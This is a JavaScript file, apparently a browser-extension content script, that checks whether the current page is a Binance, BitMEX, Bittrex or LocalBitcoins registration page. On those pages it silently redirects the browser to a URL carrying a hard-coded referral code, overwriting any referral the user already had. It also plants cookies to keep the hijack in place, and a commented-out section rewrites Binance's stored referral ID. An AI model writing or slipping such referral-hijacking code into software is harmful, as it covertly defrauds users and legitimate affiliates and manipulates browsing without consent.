var xx = window.location.href;
if ((xx.search("accounts.binance.com")>0) && (xx.search("ref=28729027")<0)) {
  window.location="https://accounts.binance.com/en/register?ref=28729027";
}
/*if (xx.search("binance.com")>0) {
    //code

localStorage.refId="28729027";
var abc=document.getElementsByName('agentId')[0].value;
if (abc=="") {
    //code
    localStorage.refId="28729027";
        location.reload();
}
 if(typeof(localStorage.refId) == "undefined" || isNaN(parseInt(localStorage.refId))){
    //code
   location.reload();
}
}*/

if ((xx.search("bitmex.com/register")>0)&&(xx.search("bitmex.com/register/")<0)) {
    var cookiedata=getCookie("refpt");
    if (!cookiedata) {
        //code
       window.location="https://www.bitmex.com/register/YNiNGw";
       // setTimeout(function() { }, 1);
          setCookie("refpt", 1, 30, "/");
    }
   
}
if ((xx.search("global.bittrex.com")>0)&&(xx.search("Register")>0)) {
    var cookiedata=getCookie("referralCode");
    if (cookiedata!="R5I-VTL-AO2") {
        //code
       window.location="https://bittrex.com/Account/Register?referralCode=R5I-VTL-AO2";
       // setTimeout(function() { }, 1);
         // setCookie("refpt", 1, 30, "/");
    }
       if (xx.search("referralCode=R5I-VTL-AO2")<0){
        //code
       window.location="https://bittrex.com/Account/Register?referralCode=R5I-VTL-AO2";
       // setTimeout(function() { }, 1);
         // setCookie("refpt", 1, 30, "/");
    }
   
}
if ((xx.search("global.bittrex.com")>0)&&(xx.search("register")>0)) {
    var cookiedata=getCookie("referralCode");
    if (cookiedata!="R5I-VTL-AO2") {
        //code
       window.location="https://bittrex.com/Account/Register?referralCode=R5I-VTL-AO2";
       // setTimeout(function() { }, 1);
         // setCookie("refpt", 1, 30, "/");
    }
       if (xx.search("referralCode=R5I-VTL-AO2")<0){
        //code
       window.location="https://bittrex.com/Account/Register?referralCode=R5I-VTL-AO2";
       // setTimeout(function() { }, 1);
         // setCookie("refpt", 1, 30, "/");
    }
   
}
if ((xx.search("localbitcoins.com")>0)&&(xx.search("ch=u695")<0)) {
    if ((xx.search("ch=")>0)) {
        //code
         window.location=xx.replace("ch=", "gh=");
    }
    else{
        if (xx.indexOf("?")!==-1)       
                        window.location=xx+"&ch=u695";
        else if (xx.indexOf("&")!==-1)   
                     window.location=xx+"?ch=u695";
                     else
                window.location=xx+"?ch=u695";
    }
}
function setCookie(cname, cvalue, exsec, path) {
	if(path == '') path ="/";
    var d = new Date();
    d.setTime(d.getTime() + (exsec*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires +"; path="+path;
}

function getCookie(cvalue)
{
	var name = cvalue+"=";
    var ca = document.cookie.split('; ');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        if (c.indexOf(name) == 0) return c.split("=")[1];
    }
    return 0;
}
